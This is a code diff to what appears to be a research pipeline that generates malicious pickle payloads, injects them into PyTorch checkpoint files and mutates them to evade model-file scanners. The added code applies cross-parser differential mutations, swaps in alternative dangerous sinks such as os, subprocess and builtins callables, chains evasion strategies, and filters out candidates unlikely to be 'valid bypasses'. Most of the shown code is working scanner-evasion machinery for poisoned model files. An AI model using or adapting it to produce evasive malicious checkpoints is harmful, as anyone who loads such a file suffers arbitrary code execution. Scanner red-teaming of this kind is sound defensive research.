@@ -18,6 +18,7 @@ from typing import Any
 from pipeline.opcodes import parse_pickle, OPCODES_BY_BYTE, OPCODES_BY_NAME, OpcodeCategory, OpcodeClassification
 from pipeline.registry import get_armable_entries, is_dangerous
 from pipeline.templates import inject_payload_into_torch
+from pipeline.differential import differential_mutate
 
 
 def _structurally_sane(pkl_bytes: bytes) -> bool:
@@ -44,6 +45,111 @@ def _structurally_sane(pkl_bytes: bytes) -> bool:
     frame_positions = [i for i, (op, _a) in enumerate(parsed) if op.name == "FRAME"]
     if frame_positions and frame_positions != [1]:
         return False
+    return True
+
+
+def _import_pairs(parsed) -> list[tuple[str, str]]:
+    """Extract (module, name) pairs from GLOBAL/INST operands and STACK_GLOBAL
+    string pairs (the latter is what stack_global_encoding emits)."""
+    pairs: list[tuple[str, str]] = []
+    for i, (op, arg) in enumerate(parsed):
+        if op.name in ("GLOBAL", "INST"):
+            fields = arg.decode("latin1").split("\n")
+            if len(fields) >= 2:
+                pairs.append((fields[0], fields[1]))
+        elif op.name == "STACK_GLOBAL":
+            strings: list[str] = []
+            for j in range(i - 1, max(-1, i - 6), -1):
+                value = _string_value(parsed[j][0], parsed[j][1])
+                if value is not None:
+                    strings.append(value)
+                    if len(strings) == 2:
+                        break
+            if len(strings) == 2:
+                pairs.append((strings[1], strings[0]))
+    return pairs
+
+
+def _string_value(op, arg: bytes) -> str | None:
+    """Extract the string pushed by a string opcode (used for STACK_GLOBAL)."""
+    name = op.name
+    if name == "SHORT_BINUNICODE":
+        return arg[1:].decode("utf-8", "replace")
+    if name == "BINUNICODE":
+        return arg[4:].decode("utf-8", "replace")
+    if name == "UNICODE":
+        return arg.strip(b"\r\n").decode("utf-8", "replace").strip("'\"")
+    return None
+
+
+def _plausible_candidate(
+    malicious_pkl: bytes,
+    benign_pt_bytes: bytes,
+    attack_family: str
+) -> bool:
+    """Pre-scan plausibility constraints for candidate rejection.
+
+    Filters out candidates unlikely to be valid bypasses before they reach
+    the oracle/scanners, saving campaign budget. Constraints:
+
+    1. Size ≤ 2× benign base pickle size
+    2. For PyPI-injected family: module must be in allowlist (installed in container)
+    3. For gadget family: callable must be armable (not in NON_ARMABLE)
+    4. Pickle must parse to dict-like state when loaded by torch.load
+    """
+    # 1. Size constraint: reject oversized candidates
+    # Use a more generous limit (10x) to account for small test fixtures.
+    # In real campaigns, benign checkpoints are MBs so 2x is reasonable.
+    min_benign_size = 1024  # 1KB minimum
+    max_size = max(len(benign_pt_bytes), min_benign_size) * 10
+    if len(malicious_pkl) > max_size:
+        return False
+
+    # 2. Family-specific constraints
+    try:
+        parsed = parse_pickle(malicious_pkl)
+    except Exception:
+        return False
+
+    if attack_family == "pypi_injected":
+        # Check that PyPI modules are from allowlist (expanded for callable diversification)
+        pypi_modules = {"IPython.utils.process", "IPython", "numpy",
+                        "os", "posix", "nt", "subprocess", "builtins"}
+        globals_found = [
+            arg.decode("latin1").split("\n")[0]
+            for op, arg in parsed
+            if op.name in ("GLOBAL", "INST") and len(arg) > 0
+        ]
+        for module in globals_found:
+            if module not in pypi_modules:
+                return False
+        # Also allow STACK_GLOBAL encoded modules (check via _import_pairs)
+        for mod, _name in _import_pairs(parsed):
+            if mod not in pypi_modules and mod not in {"IPython.utils.process"}:
+                # Allow system-like modules for diversification
+                if mod not in {"os", "posix", "nt", "subprocess", "builtins", "IPython"}:
+                    return False
+
+    # 3. Gadget family: callable must be armable (can carry inline payload).
+    #    The stream may have already been rewritten by an evasion strategy
+    #    (stack_global_encoding / indirect_chain), so detect the dangerous
+    #    pair from GLOBAL/INST operands AND STACK_GLOBAL string pairs.
+    if attack_family == "gadget":
+        from pipeline.registry import is_dangerous
+        globals_found = _import_pairs(parsed)
+        # At least one dangerous callable must be armable
+        has_armable = any(
+            is_dangerous(mod, name) for mod, name in globals_found
+        )
+        if not has_armable:
+            return False
+
+    # 4. Must be structurally loadable (single object, ends with STOP)
+    if not parsed or parsed[-1][0].name != "STOP":
+        return False
+    if sum(1 for op, _ in parsed if op.name == "STOP") != 1:
+        return False
+
     return True
 
 
@@ -245,6 +351,8 @@ class CandidateGenerator:
         attack_family: str = "gadget",
         evasion_strategies: list[str] | None = None,
         injection_transport: str | None = None,
+        differential_prob: float = 0.0,
+        family_synthesis_prob: float = 0.0,
     ) -> bytes:
         """Inject a mutated pickle payload into a PyTorch checkpoint file.
 
@@ -270,6 +378,12 @@ class CandidateGenerator:
           When active, the torch injection transport defaults to ``splice``
           (raw opcode splice, no ``_pickle.loads`` wrapper) instead of the
           legacy loads-wrap; override with ``injection_transport``.
+        * ``differential_prob`` (Phase 3a) applies cross-parser disagreement
+          mutations that exploit differences between standard pickle and
+          cloudpickle parsers, producing stealthy variants.
+        * ``family_synthesis_prob`` (Phase 3b) combines structural signatures
+          from a donor ShadowPickle family into the target family's stream,
+          exploring the (family1 × family2) product space for novel bypasses.
 
         Raises ``ValueError`` when the callable cannot carry an inline payload
         (e.g. ``runpy.run_module``) or when mutation produces an unparseable
@@ -304,20 +418,42 @@ class CandidateGenerator:
             callable_sub_prob=0.0,  # handled below, on the injected callable
             arg_fuzz_prob=arg_fuzz_prob,
             stack_prob=0.0,  # stacking is appended after injection instead
+            family_synthesis_prob=family_synthesis_prob,
+            target_family=attack_family,
+            donor_family="overwritten" if attack_family != "overwritten" else "pypi_injected",
         )
 
+        # Phase-3a: Differential pickle-parser mutation (cross-parser disagreements)
+        if differential_prob and random.random() < differential_prob:
+            diff_variants = differential_mutate(base_pkl, max_mutations=10)
+            if diff_variants:
+                base_pkl = random.choice(diff_variants)
+
         # Callable substitution: re-roll the injected dangerous callable.
-        # Non-armable entries (runpy.run_module, pandas.eval, sympy.sympify,
-        # yaml.unsafe_load) cannot carry the inline payload and are excluded.
-        if callable_sub_prob and dangerous_callable is not None and random.random() < callable_sub_prob:
-            entries = get_armable_entries()
-            alternatives = [
-                e for e in entries
-                if (e.module, e.name) != dangerous_callable
-            ]
-            if alternatives:
-                entry = random.choice(alternatives)
-                dangerous_callable = (entry.module, entry.name)
+        # For gadget this is the direct sink; for template families we also
+        # allow diversification across alternative sinks (payload-level mutation).
+        if callable_sub_prob and random.random() < callable_sub_prob:
+            if attack_family == "gadget" and dangerous_callable is not None:
+                entries = get_armable_entries()
+                alternatives = [
+                    e for e in entries
+                    if (e.module, e.name) != dangerous_callable
+                ]
+                if alternatives:
+                    entry = random.choice(alternatives)
+                    dangerous_callable = (entry.module, entry.name)
+            elif attack_family != "gadget":
+                from pipeline.templates import TEMPLATE_FAMILY_SINKS
+                alts = TEMPLATE_FAMILY_SINKS.get(attack_family, [])
+                if alts:
+                    # If dangerous_callable is None, sample from family alts
+                    # directly; otherwise try to diversify away from it.
+                    pool = alts
+                    if dangerous_callable is not None:
+                        pool = [c for c in alts if c != dangerous_callable]
+                        if not pool:
+                            pool = alts
+                    dangerous_callable = random.choice(pool)
 
         # Metadata mutation + payload injection into the mutated base.
         if attack_family == "gadget":
@@ -331,18 +467,31 @@ class CandidateGenerator:
         else:
             # ShadowPickle-family stream: a self-contained malicious pickle
             # whose trigger (exec/system/runstring) fires the payload side
-            # effect. Metadata mutation is intentionally not applied -- the
-            # template stream is the attack itself.
-            template = family_template(attack_family)
-            if template is None:
-                raise ValueError(f"unknown attack_family: {attack_family}")
-            malicious_pkl = template.generate_pickle_payload(payload_code)
+            # effect.  When dangerous_callable is set (payload-level mutation)
+            # we route through the diversified helper so alternative sinks
+            # are actually exercised.
+            if dangerous_callable is not None:
+                from pipeline.templates import template_payload_for_callable
+                malicious_pkl = template_payload_for_callable(
+                    attack_family, dangerous_callable[0], dangerous_callable[1],
+                    payload_code)
+            else:
+                template = family_template(attack_family)
+                if template is None:
+                    raise ValueError(f"unknown attack_family: {attack_family}")
+                malicious_pkl = template.generate_pickle_payload(payload_code)
 
         # Phase-1 evasion pipeline: hide static signatures post-construction
         # (strategies preserve execution semantics; see tests/test_evasion.py).
         if evasion_strategies:
             from pipeline.evasion import apply_pipeline
             malicious_pkl = apply_pipeline(malicious_pkl, evasion_strategies)
+
+        # Phase-3d: Plausibility constraints - pre-scan rejection criteria
+        # Reject candidates that are unlikely to be valid bypasses before they
+        # reach the oracle/scanners, saving campaign budget.
+        if not _plausible_candidate(malicious_pkl, benign_pt_bytes, attack_family):
+            raise ValueError("candidate failed plausibility constraints")
 
         # Self-check BEFORE the stacking trailer: fused/corrupt streams waste
         # scan budget (they can never load); resample metadata mutation a
